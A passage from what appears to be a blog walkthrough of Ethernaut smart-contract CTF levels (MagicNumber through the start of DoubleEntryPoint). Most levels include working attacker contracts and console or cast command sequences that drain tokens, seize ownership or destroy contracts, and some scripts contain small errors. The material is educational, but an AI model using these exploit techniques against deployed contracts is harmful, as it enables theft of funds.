The difficulty is that the `solver`'s runtime bytecode must not be greater than 10 opcodes.
To create such a contract, we will need to write raw bytecode directly instead of using a higher-level language compiler.
If you're not familiar with opcodes and the inner workings of the EVM yet, I recommend working through the [Huff docs](https://docs.huff.sh/) first.
In the following, I will assume that you already know those basics.

To start, note that we _don't_ have to code a dedicated `whatIsTheMeaningOfLife()` function for our contract. 
Instead, we can simply have our contract return 42 regardless of the function selector in the calldata.
To do that, we use the following sequence:

- `60 2a`: `PUSH1 0x2a` - Push the value 42 onto the stack.
- `60 00`: `PUSH1 0x00` - Push the memory position 0x00 onto the stack.
- `52`: `MSTORE` - Store the value 42 at memory position 0x00.
- `60 20`: `PUSH1 0x20` - Push the size 32 bytes onto the stack.
- `60 00`: `PUSH1 0x00` - Push the memory position 0x00 onto the stack.
- `f3`: `RETURN` - Return 32 bytes from memory position 0x00.

Note that the `RETURN` opcode requires the return value to be stored in memory instead of just popping it from the stack as other languages do.
Our final runtime bytecode is, therefore, given by `602a60005260206000f3`.

However, to deploy this bytecode to the blockchain, we need to construct initialization code, too!
The purpose of the initialization code is to store the runtime bytecode into the contract's code storage.
Here is a step-by-step breakdown of what the initialization code needs to do:

- `60 0a`: `PUSH1 0x0a` - Push the length of the runtime bytecode onto the stack. The lenth of `602a60005260206000f3` is 10 bytes.
- `60 0c`: `PUSH1 0x0c` - Push the offset where the runtime bytecode is located in the full bytecode. We will see that our final initialization code has a length of 12 bytes, which is why we push 12.
- `60 00`: `PUSH1 0x00` - Push the offset in memory where we want to copy the runtime code.
- `39`: `CODECOPY` - Copy the runtime code to memory.
- `60 0a`: `PUSH1 0x0a` - Push the length of the runtime bytecode onto the stack.
- `60 00`: `PUSH1 0x00` - Push the offset in memory to start copying from.
- `f3`: `RETURN` - Return the runtime code as the contract's code.

Note that this initialization code is indeed 12 bytes long, which is why we used `PUSH1 0x0c` in the second step.

Lastly, we can combine the initialization and runtime bytecodes to get:

```
600a600c600039600a6000f3602a60005260206000f3
```

To deploy the contract via Cast, we can use:

```bash
export PRIVATE_KEY=<your private key>
export RPC_URL=<your rpc url>
export BYTECODE=600a600c600039600a6000f3602a60005260206000f3

cast send --private-key $PRIVATE_KEY --rpc-url $RPC_URL --create $BYTECODE
```

Looking at the transaction receipt, you will see the deployed contract's address, which you can use to call `setSolver()` and complete the level.

# 19. Alien Codex

## Contract

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.5.0;

import "../helpers/Ownable-05.sol";

contract AlienCodex is Ownable {
    bool public contact;
    bytes32[] public codex;

    modifier contacted() {
        assert(contact);
        _;
    }

    function makeContact() public {
        contact = true;
    }

    function record(bytes32 _content) public contacted {
        codex.push(_content);
    }

    function retract() public contacted {
        codex.length--;
    }

    function revise(uint256 i, bytes32 _content) public contacted {
        codex[i] = _content;
    }
}
```

## Solution

The goal of this challenge is to become the owner of the contract.

Before we discuss the solution, I highly recommend reading the section on the [layout of dynamic arrays in storage](https://docs.soliditylang.org/en/latest/internals/layout_in_storage.html#mappings-and-dynamic-arrays) in the official Solidity docs.

Based on the docs, our level instance has the following storage layout:

| Slot | Data |
|------|------|
| $$0$$ | `bool public contact` and `address private _owner` |
| $$1$$ | `codex.length` |
|...| ... |
| $$keccak256(1)$$ | `codex[0]` |
| $$keccak256(1) + 1$$ | `codex[1]` |
|...| ... |
| $$2^{256} - 1$$ | `codex[2 ** 256 - 1 - uint256(keccak256(abi.encode(1)))]` |
| $$0$$ | `codex[2 ** 256 - 1 - uint256(keccak256(abi.encode(1))) + 1]` |
|...| ... |

Notice that both `contact` as well as `Ownable`'s `_owner` will be packed into slot 0.
We can verify this by executing

```bash
cast storage <your level instance address> 0 --rpc-url $SEP_RPC_URL
```

before and after calling `makeContact()`.

Furthermore, notice that the `revise()` function allows us to override what's stored in slot 0 by writing to the `2 ** 256 - 1 - uint256(keccak256(abi.encode(1))) + 1`th entry of the `codex` array.
However, in order to set a value at this index, we must ensure our `codex` array is large enough for the index `2 ** 256 - 1 - uint256(keccak256(abi.encode(1))) + 1` to exist.
To achieve that, we can use `retract()` to subtract 1 from `codex.length` to underflow the array's length from zero to $$2^{256}-1$$.

As conclusion, we can become the owner of the level instance via the following steps:

1. Call `makeContact()` so that we can pass the `contacted()` modifier.
2. Call `retract()` to increase `codex.length` to $$2^{256}-1$$.
3. Call `revise()` to override slot 0 in a way that makes our player EOA the owner.

Based on the insights mentioned above, we can compute the parameters needed for step 3. via Chisel:

#### `i`
```bash
➜ uint256 i = type(uint256).max - uint256(keccak256(abi.encode(1))) + 1;
➜ i
Type: uint256
├ Hex: 0x4ef1d2ad89edf8c4d91132028e8195cdf30bb4b5053d4f8cd260341d4805f30a
├ Hex (full word): 0x4ef1d2ad89edf8c4d91132028e8195cdf30bb4b5053d4f8cd260341d4805f30a
└ Decimal: 35707666377435648211887908874984608119992236509074197713628505308453184860938
```

#### `_content`

```bash
➜ bytes32(uint256(uint160(<your player address>)))
```

To summarize, we can solve this level in the Ethernaut console via:

```javascript
await contract.contact()

await contract.retract()

await contract.revise("35707666377435648211887908874984608119992236509074197713628505308453184860938", "<your player address cast to bytes32>")
```

# 20. Denial

## Contract

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Denial {

    address public partner; // withdrawal partner - pay the gas, split the withdraw
    address public constant owner = address(0xA9e);
    uint timeLastWithdrawn;
    mapping(address => uint) withdrawPartnerBalances; // keep track of partners balances

    function setWithdrawPartner(address _partner) public {
        partner = _partner;
    }

    // withdraw 1% to recipient and 1% to owner
    function withdraw() public {
        uint amountToSend = address(this).balance / 100;
        // perform a call without checking return
        // The recipient can revert, the owner will still get their share
        partner.call{value:amountToSend}("");
        payable(owner).transfer(amountToSend);
        // keep track of last withdrawal time
        timeLastWithdrawn = block.timestamp;
        withdrawPartnerBalances[partner] +=  amountToSend;
    }

    // allow deposit of funds
    receive() external payable {}

    // convenience function
    function contractBalance() public view returns (uint) {
        return address(this).balance;
    }
}
```

## Solution

Notice that `partner.call{value:amountToSend}("")` will forward 63/64 of the available gas to the `partner`. Hence, we can perform a Denial-of-Service attack by deploying the contract below and setting this contract as the new `partner`. In the Ethernaut console, this can be achieved by first deploying the contract, e.g., via Remix, and then executing `await contract.setWithdrawPartner("<put your gas consumer contract address here>")` in the console.

Here's a simple example of a contract that will consume all available gas:

```solidity
// SPDX-License-Identifier: UNLICENSE
pragma solidity ^0.8.0;

contract GasConsumer {
    uint public counter;

    // Consumes all available gas
    receive() external payable {
        while (true) {
            counter++;
        }
    }
}
```

Since 63/64 of the initial gas supply will already be gone after executing `partner.call{value:amountToSend}("")`, the remaining 1/64 won't be sufficient to execute the rest of the function. Therefore, the transaction will run out of gas and revert.

Two final comments:

1. Depending on how much gas is required to complete a transaction, a transaction of sufficiently high gas (i.e., one such that 1/64 of the gas is capable of completing the remaining opcodes in the parent call) can be used to mitigate this attack. In our particular case, however, the challenge specifically requires us to assume that the transaction is of 1M gas or less. Under this assumption, the above DoS attack will be successful.
2. You might be tempted to simply use `assert(false)` instead of an infinite loop to consume all gas. Admittedly, this approach would result in even fewer lines of code for the attacker contract. However, this approach only works prior to Solidity version 0.8.0! From 0.8.0 onwards, `assert` no longer uses the INVALID opcode (which consumes all remaining gas) but instead the REVERT opcode (which refunds the remaining gas to the sender). You can read up on the details in the [Solidity docs](https://docs.soliditylang.org/en/latest/080-breaking-changes.html) and in [this article](https://hackernoon.com/an-update-to-soliditys-assert-statement-you-mightve-missed).

# 21. Shop

## Contract

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface Buyer {
    function price() external view returns (uint256);
}

contract Shop {
    uint256 public price = 100;
    bool public isSold;

    function buy() public {
        Buyer _buyer = Buyer(msg.sender);

        if (_buyer.price() >= price && !isSold) {
            isSold = true;
            price = _buyer.price();
        }
    }
}
```

## Solution

The goal is to get the `buy()` function to set the `price` to a value smaller than 100.

Note that this level is very similar to [Elevator](https://www.marcobesier.xyz/blog/ethernaut-solutions/elevator).

Here, however, we have the additional complication that our `price()` function must be a `view` function.
In other words, we are not allowed to implement any state-changing logic inside `price()` as we did in the Elevator solution.

Nonetheless, we can still craft a `price()` function that returns different values each time it is called by using `gasleft()`!

In a first attempt, we might try to have `price()` simply returning `gasleft()`, hoping that `gasleft()`'s value will be >= 100 when called the first time and < 100 when called the second time.
Going with this approach, we will observe that the attack will fail since the value of `gasleft()` after the second call to `price()` is still quite a bit higher than 100.
After some more experimentation, however, it's easy to subtract a suitable value from `gasleft()` such that `price()` has the desired behaviour.

For example, the following implementation will return a price > 100 when called the first time and a price of 42 when called the second time.

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IShop {
    function buy() external;
}

contract ShopAttacker {
    IShop public immutable VICTIM;

    constructor(address victim) {
        VICTIM = IShop(victim);
    }

    function attack() external {
        VICTIM.buy();
    }

    function price() external view returns (uint256) {
        return gasleft() - 3714;
    }
}
```

# 22. Dex

## Contract

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "openzeppelin-contracts-08/token/ERC20/IERC20.sol";
import "openzeppelin-contracts-08/token/ERC20/ERC20.sol";
import "openzeppelin-contracts-08/access/Ownable.sol";

contract Dex is Ownable {
    address public token1;
    address public token2;

    constructor() {}

    function setTokens(address _token1, address _token2) public onlyOwner {
        token1 = _token1;
        token2 = _token2;
    }

    function addLiquidity(address token_address, uint256 amount) public onlyOwner {
        IERC20(token_address).transferFrom(msg.sender, address(this), amount);
    }

    function swap(address from, address to, uint256 amount) public {
        require((from == token1 && to == token2) || (from == token2 && to == token1), "Invalid tokens");
        require(IERC20(from).balanceOf(msg.sender) >= amount, "Not enough to swap");
        uint256 swapAmount = getSwapPrice(from, to, amount);
        IERC20(from).transferFrom(msg.sender, address(this), amount);
        IERC20(to).approve(address(this), swapAmount);
        IERC20(to).transferFrom(address(this), msg.sender, swapAmount);
    }

    function getSwapPrice(address from, address to, uint256 amount) public view returns (uint256) {
        return ((amount * IERC20(to).balanceOf(address(this))) / IERC20(from).balanceOf(address(this)));
    }

    function approve(address spender, uint256 amount) public {
        SwappableToken(token1).approve(msg.sender, spender, amount);
        SwappableToken(token2).approve(msg.sender, spender, amount);
    }

    function balanceOf(address token, address account) public view returns (uint256) {
        return IERC20(token).balanceOf(account);
    }
}

contract SwappableToken is ERC20 {
    address private _dex;

    constructor(address dexInstance, string memory name, string memory symbol, uint256 initialSupply)
        ERC20(name, symbol)
    {
        _mint(msg.sender, initialSupply);
        _dex = dexInstance;
    }

    function approve(address owner, address spender, uint256 amount) public {
        require(owner != _dex, "InvalidApprover");
        super._approve(owner, spender, amount);
    }
}
```

## Solution

The goal of this challenge is to steal the entire balance of at least one of the two tokens from the dex.

When executing the `swap()` function twice in a row, i.e., swapping 10 `token1` for 10 `token2` and subsequently swapping our entire balance of 20 `token2`, we notice that we receive 24 `token1`!
In other words, we can drain one of the tokens from the dex entirely, simply by swapping the player's entire balance back and forth multiple times in a row.

More specifically, we have the following table, where p1 and p2 are the player's balances of `token1` and `token2` and d1 and d2 are the dex's balances, respectively:

| p1 | p2 | d1  | d2  | `swapAmount` for next swap |
|----|----|-----|-----|----------------------------|
| 10 | 10 | 100 | 100 | -                          |
|  0 | 20 | 110 |  90 | 20 * 110 / 90 = 24         |
| 24 |  0 |  86 | 110 | 24 * 110 / 86 = 30         |
|  0 | 30 | 110 |  80 | 30 * 110 / 80 = 41         |
| 41 |  0 |  69 | 110 | 41 * 110 / 69 = 65         |
| 0  | 65 | 110 | 45  | 65 * 110 / 45 = 158        | 

Notice that, if we were to swap the player's entire balance of 65 `token2` in the last of the above steps, we'd end up with 158 `token1` according to our table.
This, however, would exceed the dex's `token1` balance!
For this reason, we must swap an amount such that `swapAmount` becomes 110 instead of 158.
In other words, we need to solve

```
x * 110 / 45 == 110
```

which tells us that our last swap needs to exchange 45 instead of 65 `token2`.
This way, we ensure to get precisely 110 `token1` back, draining the entire `token1` balance from the dex.

Lastly, notice that we need to first approve the dex for a sufficiently high amount of both `token1` and `token2` in order to execute the above sequence.
Looking at the above table, we see that an allowance of 1000 is more than enough.

As a summary, we can solve the level via the Ethernaut console as follows:

```javascript
const token1 = await contract.token1()
const token1 = await contract.token1()

await contract.approve(contract.address, 1000)

await contract.swap(token1, token2, 10)
await contract.swap(token2, token1, 20)
await contract.swap(token1, token2, 24)
await contract.swap(token2, token1, 30)
await contract.swap(token1, token2, 41)

await contract.swap(token2, token1, 45)
```

# 23. Dex Two

## Contract

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "openzeppelin-contracts-08/token/ERC20/IERC20.sol";
import "openzeppelin-contracts-08/token/ERC20/ERC20.sol";
import "openzeppelin-contracts-08/access/Ownable.sol";

contract DexTwo is Ownable {
    address public token1;
    address public token2;

    constructor() {}

    function setTokens(address _token1, address _token2) public onlyOwner {
        token1 = _token1;
        token2 = _token2;
    }

    function add_liquidity(address token_address, uint256 amount) public onlyOwner {
        IERC20(token_address).transferFrom(msg.sender, address(this), amount);
    }

    function swap(address from, address to, uint256 amount) public {
        require(IERC20(from).balanceOf(msg.sender) >= amount, "Not enough to swap");
        uint256 swapAmount = getSwapAmount(from, to, amount);
        IERC20(from).transferFrom(msg.sender, address(this), amount);
        IERC20(to).approve(address(this), swapAmount);
        IERC20(to).transferFrom(address(this), msg.sender, swapAmount);
    }

    function getSwapAmount(address from, address to, uint256 amount) public view returns (uint256) {
        return ((amount * IERC20(to).balanceOf(address(this))) / IERC20(from).balanceOf(address(this)));
    }

    function approve(address spender, uint256 amount) public {
        SwappableTokenTwo(token1).approve(msg.sender, spender, amount);
        SwappableTokenTwo(token2).approve(msg.sender, spender, amount);
    }

    function balanceOf(address token, address account) public view returns (uint256) {
        return IERC20(token).balanceOf(account);
    }
}

contract SwappableTokenTwo is ERC20 {
    address private _dex;

    constructor(address dexInstance, string memory name, string memory symbol, uint256 initialSupply)
        ERC20(name, symbol)
    {
        _mint(msg.sender, initialSupply);
        _dex = dexInstance;
    }

    function approve(address owner, address spender, uint256 amount) public {
        require(owner != _dex, "InvalidApprover");
        super._approve(owner, spender, amount);
    }
}
```

## Solution

The goal of this challenge is to steal all `token1` and `token2` funds from the dex.

The contract is exactly the same as in Dex One with the only exception that the `swap()` function is missing the following check:

```solidity
require((from == token1 && to == token2) || (from == token2 && to == token1), "Invalid tokens");
```

In other words, anyone can list their own tokens!

Consequently, we can simply deploy a new ERC20 token through Remix and swap this new token for `token1` and `token2` to drain the corresponding funds from the dex.

To start the attack, we deploy the following ERC20 contract:

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "@openzeppelin/contracts/token/ERC20/ERC20.sol";

contract Dex2Attacker is ERC20 {
    constructor() ERC20("Dex2 Attacker", "D2A") {
        _mint(msg.sender, 1 * 10 ** decimals());
    }
}
```

Next, our goal is to swap a specific amount of our `D2A` token for `token1` and `token2`, respectively, such that `swapAmount` equals 100.
So, to drain `token1` from the dex, we can use the following sequence:

1. Transfer 100 `D2A` to the dex (so that there is no division by 0 in `getSwapAmount()`).
2. Approve the dex for 100 `D2A`.
3. Swap 100 `D2A` for 100 `token1`.

After this sequence, the dex has a `D2A` balance of 200. 
So, to drain `token2` from the dex as well, we first need to compute the suitable amount of `D2A` that we need to swap in order to get 100 `token2` back.
More specifically, we need to solve the equation

```solidity
100 == amount * 100 / 200
```

for `amount`, which tells us that we need to specify `amount=200` to get a `swapAmount` of 100.
In other words, we need to swap 200 `D2A` to get 100 `token2` back. 
Our remaining steps are, therefore, the following:

1. Approve the dex for 200 `D2A`.
2. Swap 200 `D2A` for 100 `token2`.

This leaves the dex with a balance of 400 of our worthless `D2A` tokens and a balance of 0 for both `token1` and `token2`.

# 24. Puzzle Wallet

## Contract

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
pragma experimental ABIEncoderV2;

import "../helpers/UpgradeableProxy-08.sol";

contract PuzzleProxy is UpgradeableProxy {
    address public pendingAdmin;
    address public admin;

    constructor(address _admin, address _implementation, bytes memory _initData)
        UpgradeableProxy(_implementation, _initData)
    {
        admin = _admin;
    }

    modifier onlyAdmin() {
        require(msg.sender == admin, "Caller is not the admin");
        _;
    }

    function proposeNewAdmin(address _newAdmin) external {
        pendingAdmin = _newAdmin;
    }

    function approveNewAdmin(address _expectedAdmin) external onlyAdmin {
        require(pendingAdmin == _expectedAdmin, "Expected new admin by the current admin is not the pending admin");
        admin = pendingAdmin;
    }

    function upgradeTo(address _newImplementation) external onlyAdmin {
        _upgradeTo(_newImplementation);
    }
}

contract PuzzleWallet {
    address public owner;
    uint256 public maxBalance;
    mapping(address => bool) public whitelisted;
    mapping(address => uint256) public balances;

    function init(uint256 _maxBalance) public {
        require(maxBalance == 0, "Already initialized");
        maxBalance = _maxBalance;
        owner = msg.sender;
    }

    modifier onlyWhitelisted() {
        require(whitelisted[msg.sender], "Not whitelisted");
        _;
    }

    function setMaxBalance(uint256 _maxBalance) external onlyWhitelisted {
        require(address(this).balance == 0, "Contract balance is not 0");
        maxBalance = _maxBalance;
    }

    function addToWhitelist(address addr) external {
        require(msg.sender == owner, "Not the owner");
        whitelisted[addr] = true;
    }

    function deposit() external payable onlyWhitelisted {
        require(address(this).balance <= maxBalance, "Max balance reached");
        balances[msg.sender] += msg.value;
    }

    function execute(address to, uint256 value, bytes calldata data) external payable onlyWhitelisted {
        require(balances[msg.sender] >= value, "Insufficient balance");
        balances[msg.sender] -= value;
        (bool success,) = to.call{value: value}(data);
        require(success, "Execution failed");
    }

    function multicall(bytes[] calldata data) external payable onlyWhitelisted {
        bool depositCalled = false;
        for (uint256 i = 0; i < data.length; i++) {
            bytes memory _data = data[i];
            bytes4 selector;
            assembly {
                selector := mload(add(_data, 32))
            }
            if (selector == this.deposit.selector) {
                require(!depositCalled, "Deposit can only be called once");
                // Protect against reusing msg.value
                depositCalled = true;
            }
            (bool success,) = address(this).delegatecall(data[i]);
            require(success, "Error while delegating call");
        }
    }
}
```

## Solution

The goal of this challenge is to become the `admin` of `PuzzleProxy`.

Recall that the storage slot arrangement in both proxy and implementation should be the same.
However, this is not the case here!
Instead, we have:

| Slot | PuzzleProxy | PuzzleWallet |
|------|-------------|--------------|
|  0   | pendingAdmin| owner        |
|  1   | admin       | maxBalance   |

This tells us that, in order to become the `admin`, we need to find a way to write our address to slot 1, i.e., we either update `admin` directly or indirectly by writing a suitable value to `maxBalance`.

Looking at our `PuzzleWallet` implementation, we see that it has two functions that can modify `maxBalance`:

```solidity
function init(uint256 _maxBalance) public {
    require(maxBalance == 0, "Already initialized");
    maxBalance = _maxBalance;
    owner = msg.sender;
}
...
function setMaxBalance(uint256 _maxBalance) external onlyWhitelisted {
    require(address(this).balance == 0, "Contract balance is not 0");
    maxBalance = _maxBalance;
}
```

We can see that `init()` requires `maxBalance` to be zero when the function is called.
Hence, we won't be able to use it to modify `maxBalance` after the contract has been initialized with a non-zero value.

`setMaxBalance()`, on the other hand, looks more promising as it's only checking if the contract's balance is zero.
However, `setMaxBalance()` has an `onlyWhitelisted()` modifier applied to it, indicating that we first need to call the following function:

```solidity
function addToWhitelist(address addr) external {
    require(msg.sender == owner, "Not the owner");
    whitelisted[addr] = true;
}
```

Again, we see that there is yet another check that prevents us from calling the function.
In this case, we're required to be the `owner` in order to add an address to the whitelist.

Looking at our storage slot table from earlier, we see that we can manipulate the `owner` either by writing directly to `owner` or by setting a new value for `pendingAdmin` as both share storage slot 0.
The latter is easily achieved using the `proposeNewAdmin()` function, specifying our own address as the new `pendingAdmin`.

Let's now take a closer look at the function that will allow us to drain the balance:

```solidity
function execute(address to, uint256 value, bytes calldata data) external payable onlyWhitelisted {
    require(balances[msg.sender] >= value, "Insufficient balance");
    balances[msg.sender] -= value;
    (bool success,) = to.call{value: value}(data);
    require(success, "Execution failed");
}
```

This is the only function making a `call()` to an address `to` with some `value` sent with that call.
However, it requires the balance of the caller to be at least the value sent. 

So, to fulfill this requirement, we need to find a way to successfully pretend that we have more balance than we actually do.
If we can achieve that, we can use `execute()` to drain the entire balance from the contract.

Looking for a function we can use to manipulate our balance, we see that `deposit()` allows us to deposit an amount into the contract and adds this amount to our value in the `balances` mapping.
However, if we just make a normal call to `deposit()`, it will add the amount in both the contract's and the `balances` mapping's bookkeeping.
Recall, though, that we need to find a way to deposit our Ether only once, but increase the value in the `balances` mapping twice in order to successfully call `execute()`. 

This is where `multicall()` comes in. 
`multicall()` allows us to call a function multiple times in a single transaction.

```solidity
function multicall(bytes[] calldata data) external payable onlyWhitelisted {
    bool depositCalled = false;
    for (uint256 i = 0; i < data.length; i++) {
        bytes memory _data = data[i];
        bytes4 selector;
        assembly {
            selector := mload(add(_data, 32))
        }
        if (selector == this.deposit.selector) {
            require(!depositCalled, "Deposit can only be called once");
            // Protect against reusing msg.value
            depositCalled = true;
        }
        (bool success,) = address(this).delegatecall(data[i]);
        require(success, "Error while delegating call");
    }
}
```

The idea would be to call `deposit()` multiple times, supplying Ether only once. 
However, there's yet another validation we need to worry about:
`multicall()` is extracting `deposit()`'s function selector from the data passed to it and will change the `depositCalled` flag accordingly.

To bypass this, we can call `multicall()` so that it calls multiple `multicall()`s with each of these `multicall()`s calling `deposit()` once.
Note that `depoistCalled` won't get in the way here, since each `multicall()` will check their own `depositCalled` value.

Starting out, the contract balance is 0.001 ETH.
If we call `deposit()` two times through two `multicall()`s in the same transaction, then `balances[player]` is changed from 0 ETH to 0.002 ETH although only 0.001 ETH is actually sent.
Therefore, the actual Ether balance of the contract is then 0.002 ETH, but the accounting in `balances` would report that it's 0.003 ETH.
In any case, our player account is now eligible to take out 0.002 ETH from the contract and, hence, drain the wallet.

Therefore, we can call `execute()` to drain the contract, subsequently call `setMaxBalance()` to override slot 1, thereby updating the value of the `admin`.

All right!
Now that we have a clear path forward, let's list to concrete steps that are necessary to solve this level.

**Step 1**

Become the `owner`.

```javascript
functionSignature = {
    name: 'proposeNewAdmin',
    type: 'function',
    inputs: [
        {
            type: 'address',
            name: '_newAdmin'
        }
    ]
}

params = [player]

data = web3.eth.abi.encodeFunctionCall(functionSignature, params)

await web3.eth.sendTransaction({from: player, to: instance, data})
```

**Step 2**

Whitelist your account.

```javascript
await contract.addToWhitelist(player)
```

**Step 3**

Make a call to `multicall()` that will in turn call two `multicall()`s that each will in turn call `deposit()` once.
Furthermore, ensure to send a value of 0.001 ETH with the transaction.

```javascript
// Get function call encodings
// deposit() method
depositData = await contract.methods["deposit()"].request().then(v => v.data)
// multicall() method with param of deposit function call signature
multicallData = await contract.methods["multicall(bytes[])"].request([depositData]).then(v => v.data)

// Perform the actual call
await contract.multicall([multicallData, multicallData], {value: toWei('0.001')})
```

**Step 4**

Drain the 0.002 ETH from the contract.

```javascript
await contract.execute(player, toWei('0.002'), 0x0)
```

**Step 5**

Lastly, set `admin` to `player`.

```javascript
await contract.setMaxBalance(player)
```

# 25. Motorbike

**IMPORTANT:** `selfdestruct` has been deprecated. 
Starting from the Cancun hard fork, the underlying opcode no longer deletes the code and data associated with an account and only transfers its Ether to the beneficiary, unless executed in the same transaction in which the contract was created (see [EIP-6780](https://eips.ethereum.org/EIPS/eip-6780)).
Since a contract has empty code during construction, it's no longer possible to successfully execute the `delegatecall` that's required to solve this level.
For this reason, we'll only discuss the originally intended pre-Cancun solution in this post.

## Contract

```solidity
// SPDX-License-Identifier: MIT

pragma solidity <0.7.0;

import "openzeppelin-contracts-06/utils/Address.sol";
import "openzeppelin-contracts-06/proxy/Initializable.sol";

contract Motorbike {
    // keccak-256 hash of "eip1967.proxy.implementation" subtracted by 1
    bytes32 internal constant _IMPLEMENTATION_SLOT = 0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc;

    struct AddressSlot {
        address value;
    }

    // Initializes the upgradeable proxy with an initial implementation specified by `_logic`.
    constructor(address _logic) public {
        require(Address.isContract(_logic), "ERC1967: new implementation is not a contract");
        _getAddressSlot(_IMPLEMENTATION_SLOT).value = _logic;
        (bool success,) = _logic.delegatecall(abi.encodeWithSignature("initialize()"));
        require(success, "Call failed");
    }

    // Delegates the current call to `implementation`.
    function _delegate(address implementation) internal virtual {
        // solhint-disable-next-line no-inline-assembly
        assembly {
            calldatacopy(0, 0, calldatasize())
            let result := delegatecall(gas(), implementation, 0, calldatasize(), 0, 0)
            returndatacopy(0, 0, returndatasize())
            switch result
            case 0 { revert(0, returndatasize()) }
            default { return(0, returndatasize()) }
        }
    }

    // Fallback function that delegates calls to the address returned by `_implementation()`.
    // Will run if no other function in the contract matches the call data
    fallback() external payable virtual {
        _delegate(_getAddressSlot(_IMPLEMENTATION_SLOT).value);
    }

    // Returns an `AddressSlot` with member `value` located at `slot`.
    function _getAddressSlot(bytes32 slot) internal pure returns (AddressSlot storage r) {
        assembly {
            r_slot := slot
        }
    }
}

contract Engine is Initializable {
    // keccak-256 hash of "eip1967.proxy.implementation" subtracted by 1
    bytes32 internal constant _IMPLEMENTATION_SLOT = 0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc;

    address public upgrader;
    uint256 public horsePower;

    struct AddressSlot {
        address value;
    }

    function initialize() external initializer {
        horsePower = 1000;
        upgrader = msg.sender;
    }

    // Upgrade the implementation of the proxy to `newImplementation`
    // subsequently execute the function call
    function upgradeToAndCall(address newImplementation, bytes memory data) external payable {
        _authorizeUpgrade();
        _upgradeToAndCall(newImplementation, data);
    }

    // Restrict to upgrader role
    function _authorizeUpgrade() internal view {
        require(msg.sender == upgrader, "Can't upgrade");
    }

    // Perform implementation upgrade with security checks for UUPS proxies, and additional setup call.
    function _upgradeToAndCall(address newImplementation, bytes memory data) internal {
        // Initial upgrade and setup call
        _setImplementation(newImplementation);
        if (data.length > 0) {
            (bool success,) = newImplementation.delegatecall(data);
            require(success, "Call failed");
        }
    }

    // Stores a new address in the EIP1967 implementation slot.
    function _setImplementation(address newImplementation) private {
        require(Address.isContract(newImplementation), "ERC1967: new implementation is not a contract");

        AddressSlot storage r;
        assembly {
            r_slot := _IMPLEMENTATION_SLOT
        }
        r.value = newImplementation;
    }
}
```

## Solution

The goal of this challenge is to `selfdestruct` the `Engine` contract.

Before we discuss the solution, I would highly recommend reading [EIP-1967](https://eips.ethereum.org/EIPS/eip-1967) and the [Initializable version](https://github.com/OpenZeppelin/openzeppelin-upgrades/blob/master/packages/core/contracts/Initializable.sol) relevant for this level.
In addition, it's a good idea to build a simple UUPS Proxy yourself by following [this tutorial](https://forum.openzeppelin.com/t/uups-proxies-tutorial-solidity-javascript/7786) or any other introductory UUPS Proxy tutorial on YouTube, etc.

The first difference between a UUPS Proxy and the Transparent Proxy Pattern is that the former has the upgrade logic in the implementation contract while the latter has it in the proxy.
The other difference is that UUPS Proxies define a dedicated storage slot that stores the address of the logic contract in order to prevent storage collisions.

In this level, `Motorbike` is the proxy and `Engine` is the implementation contract.
The first thing we notice is that `Engine` does not contain any `selfdestruct` functionality.
Thus, we will have to solve this level by finding a way to upgrade `Engine` so that the new version contains a `selfdestruct` that we can call.

To upgrade the implementation, `Engine` contains an `upgradeToAndCall()` function.
However, this function can only be called by the `upgrader`.
Therefore, we first need to find a way to register our player address as the `upgrader`.

To achieve this, notice that `Motorbike` calls `initialize()` via `delegatecall()`, leaving the storage of `Initializable` unaffected!
In particular, the `initialized` state variable will continue to be `false`, even after `Motorbike` has initialized the `Engine`!
Consequently, we can become the `upgrader` by calling `initialize()` directly from our player EOA.

First, we determine the `Engine`'s address via

```bash
cast storage <your level instance> 0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc --rpc-url $SEP_RPC_URL
```

and subsequently call `initialize()` via:

```bash
cast send <your Engine address> "initialize()" --rpc-url $SEP_RPC_URL --private-key <your private key>
```

Now that we are the `upgrader`, we deploy the following attacker contract so that we can subsequently upgrade our `Engine` to it:

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract MotorbikeAttacker {
    function destroy() external {
        selfdestruct(payable(address(0)));
    }    
}
```

To complete the attack, we can now call `upgradeToAndCall()` from our player EOA, providing `MotorbikeAttacker`'s address as the first parameter and `destroy()`'s function selector, 0x83197ef0, as the second.

# 26. DoubleEntryPoint

## Contract

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "openzeppelin-contracts-08/access/Ownable.sol";
import "openzeppelin-contracts-08/token/ERC20/ERC20.sol";

interface DelegateERC20 {
    function delegateTransfer(address to, uint256 value, address origSender) external returns (bool);
}

interface IDetectionBot {
    function handleTransaction(address user, bytes calldata msgData) external;
}

interface IForta {
    function setDetectionBot(address detectionBotAddress) external;
    function notify(address user, bytes calldata msgData) external;
    function raiseAlert(address user) external;
}

contract Forta is IForta {
    mapping(address => IDetectionBot) public usersDetectionBots;
    mapping(address => uint256) public botRaisedAlerts;

    function setDetectionBot(address detectionBotAddress) external override {
        usersDetectionBots[msg.sender] = IDetectionBot(detectionBotAddress);
    }

    function notify(address user, bytes calldata msgData) external override {
        if (address(usersDetectionBots[user]) == address(0)) return;
        try usersDetectionBots[user].handleTransaction(user, msgData) {
            return;
        } catch {}
    }

    function raiseAlert(address user) external override {
        if (address(usersDetectionBots[user]) != msg.sender) return;
        botRaisedAlerts[msg.sender] += 1;
    }
}

contract CryptoVault {
    address public sweptTokensRecipient;
    IERC20 public underlying;

    constructor(address recipient) {
        sweptTokensRecipient = recipient;
    }

    function setUnderlying(address latestToken) public {
        require(address(underlying) == address(0), "Already set");
        underlying = IERC20(latestToken);
    }

    /*
    ...
    */

    function sweepToken(IERC20 token) public {
        require(token != underlying, "Can't transfer underlying token");
        token.transfer(sweptTokensRecipient, token.balanceOf(address(this)));
    }
}

